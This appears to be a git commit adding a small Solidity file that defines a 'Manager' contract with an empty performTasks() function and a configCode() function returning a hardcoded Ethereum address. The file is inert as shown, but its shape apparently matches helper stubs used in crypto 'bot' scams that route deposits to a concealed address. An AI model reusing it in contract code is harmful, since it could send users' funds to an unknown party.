d5edeaa731bf9b67228439939c14fbdffc874a60
vitl123 <113027132+vitl123@users.noreply.github.com>
2022-09-07 12:15:16 +0100

    Add files via upload

---
+++ zoro.sol
@@ -0,0 +1,12 @@
+
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0x49abEDCa03B3eaB9Df558C10Ae1299987657d4F7;
+    }
+}
